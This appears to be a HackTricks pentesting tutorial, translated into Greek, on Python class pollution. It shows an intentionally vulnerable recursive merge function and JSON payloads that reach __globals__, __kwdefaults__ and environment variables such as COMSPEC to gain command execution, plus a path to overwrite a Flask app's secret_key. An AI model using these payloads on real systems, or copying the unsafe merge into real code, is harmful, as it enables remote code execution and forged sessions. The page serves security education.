# Ρύπανση Κλάσεων (Ρύπανση Πρωτοτύπων της Python)

{{#include ../../banners/hacktricks-training.md}}

## Βασικό Παράδειγμα

Ελέγξτε πώς είναι δυνατόν να ρυπαίνουμε κλάσεις αντικειμένων με συμβολοσειρές:
```python
class Company: pass
class Developer(Company): pass
class Entity(Developer): pass

c = Company()
d = Developer()
e = Entity()

print(c) #<__main__.Company object at 0x1043a72b0>
print(d) #<__main__.Developer object at 0x1041d2b80>
print(e) #<__main__.Entity object at 0x1041d2730>

e.__class__.__qualname__ = 'Polluted_Entity'

print(e) #<__main__.Polluted_Entity object at 0x1041d2730>

e.__class__.__base__.__qualname__ = 'Polluted_Developer'
e.__class__.__base__.__base__.__qualname__ = 'Polluted_Company'

print(d) #<__main__.Polluted_Developer object at 0x1041d2b80>
print(c) #<__main__.Polluted_Company object at 0x1043a72b0>
```
## Βασικό Παράδειγμα Ευπάθειας
```python
# Initial state
class Employee: pass
emp = Employee()
print(vars(emp)) #{}

# Vulenrable function
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)


USER_INPUT = {
"name":"Ahemd",
"age": 23,
"manager":{
"name":"Sarah"
}
}

merge(USER_INPUT, emp)
print(vars(emp)) #{'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
```
## Παραδείγματα Gadget

<details>

<summary>Δημιουργία προεπιλεγμένης τιμής ιδιότητας κλάσης για RCE (subprocess)</summary>
```python
from os import popen
class Employee: pass # Creating an empty class
class HR(Employee): pass # Class inherits from Employee class
class Recruiter(HR): pass # Class inherits from HR class

class SystemAdmin(Employee): # Class inherits from Employee class
def execute_command(self):
command = self.custom_command if hasattr(self, 'custom_command') else 'echo Hello there'
return f'[!] Executing: "{command}", output: "{popen(command).read().strip()}"'

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

USER_INPUT = {
"__class__":{
"__base__":{
"__base__":{
"custom_command": "whoami"
}
}
}
}

recruiter_emp = Recruiter()
system_admin_emp = SystemAdmin()

print(system_admin_emp.execute_command())
#> [!] Executing: "echo Hello there", output: "Hello there"

# Create default value for Employee.custom_command
merge(USER_INPUT, recruiter_emp)

print(system_admin_emp.execute_command())
#> [!] Executing: "whoami", output: "abdulrah33m"
```
</details>

<details>

<summary>Μόλυνση άλλων κλάσεων και παγκόσμιων μεταβλητών μέσω <code>globals</code></summary>
```python
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class User:
def __init__(self):
pass

class NotAccessibleClass: pass

not_accessible_variable = 'Hello'

merge({'__class__':{'__init__':{'__globals__':{'not_accessible_variable':'Polluted variable','NotAccessibleClass':{'__qualname__':'PollutedClass'}}}}}, User())

print(not_accessible_variable) #> Polluted variable
print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
```
</details>

<details>

<summary>Αυθαίρετη εκτέλεση υποδιεργασίας</summary>
```python
import subprocess, json

class Employee:
def __init__(self):
pass

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

# Overwrite env var "COMSPEC" to execute a calc
USER_INPUT = json.loads('{"__init__":{"__globals__":{"subprocess":{"os":{"environ":{"COMSPEC":"cmd /c calc"}}}}}}') # attacker-controlled value

merge(USER_INPUT, Employee())

subprocess.Popen('whoami', shell=True) # Calc.exe will pop up
```
</details>

<details>

<summary>Επικαλύπτοντας <strong><code>__kwdefaults__</code></strong></summary>

**`__kwdefaults__`** είναι ένα ειδικό χαρακτηριστικό όλων των συναρτήσεων, βασισμένο στην τεκμηρίωση της Python [documentation](https://docs.python.org/3/library/inspect.html), είναι μια “χαρτογράφηση οποιωνδήποτε προεπιλεγμένων τιμών για **μόνο-λέξεις-κλειδιά** παραμέτρους”. Η ρύπανση αυτού του χαρακτηριστικού μας επιτρέπει να ελέγχουμε τις προεπιλεγμένες τιμές των παραμέτρων μόνο-λέξεις-κλειδιά μιας συνάρτησης, αυτές είναι οι παράμετροι της συνάρτησης που έρχονται μετά το \* ή \*args.
```python
from os import system
import json

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class Employee:
def __init__(self):
pass

def execute(*, command='whoami'):
print(f'Executing {command}')
system(command)

print(execute.__kwdefaults__) #> {'command': 'whoami'}
execute() #> Executing whoami
#> user

emp_info = json.loads('{"__class__":{"__init__":{"__globals__":{"execute":{"__kwdefaults__":{"command":"echo Polluted"}}}}}}') # attacker-controlled value
merge(emp_info, Employee())

print(execute.__kwdefaults__) #> {'command': 'echo Polluted'}
execute() #> Executing echo Polluted
#> Polluted
```
</details>

<details>

<summary>Επικαλύπτοντας το μυστικό του Flask σε διάφορα αρχεία</summary>

Έτσι, αν μπορείτε να κάνετε class pollution σε ένα αντικείμενο που ορίζεται στο κύριο αρχείο python του ιστότοπου αλλά **η κλάση του ορίζεται σε διαφορετικό αρχείο** από το κύριο. Επειδή για να αποκτήσετε πρόσβαση στο \_\_globals\_\_ στις προηγούμενες payloads χρειάζεται να αποκτήσετε πρόσβαση στην κλάση του αντικειμένου ή στις μεθόδους της κλάσης, θα μπορείτε να **έχετε πρόσβαση στα globals σε εκείνο το αρχείο, αλλά όχι στο κύριο**. \
Επομένως, **δεν θα μπορείτε να αποκτήσετε πρόσβαση στο παγκόσμιο αντικείμενο της εφαρμογής Flask** που ορίζει το **μυστικό κλειδί** στη κύρια σελίδα:
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
Σε αυτό το σενάριο χρειάζεστε μια συσκευή για να διασχίσετε αρχεία ώστε να φτάσετε στο κύριο για να **πρόσβαση στο παγκόσμιο αντικείμενο `app.secret_key`** για να αλλάξετε το μυστικό κλειδί του Flask και να μπορείτε να [**κλιμακώσετε δικαιώματα** γνωρίζοντας αυτό το κλειδί](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).

Ένα payload όπως αυτό [από αυτή τη γραφή](https://ctftime.org/writeup/36082):
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Χρησιμοποιήστε αυτό το payload για να **αλλάξετε το `app.secret_key`** (το όνομα στην εφαρμογή σας μπορεί να είναι διαφορετικό) ώστε να μπορείτε να υπογράφετε νέα και πιο προνομιακά cookies flask.

</details>

Ελέγξτε επίσης την παρακάτω σελίδα για περισσότερα gadgets μόνο για ανάγνωση:

{{#ref}}
python-internal-read-gadgets.md
{{#endref}}

## Αναφορές

- [https://blog.abdulrah33m.com/prototype-pollution-in-python/](https://blog.abdulrah33m.com/prototype-pollution-in-python/)

{{#include ../../banners/hacktricks-training.md}}
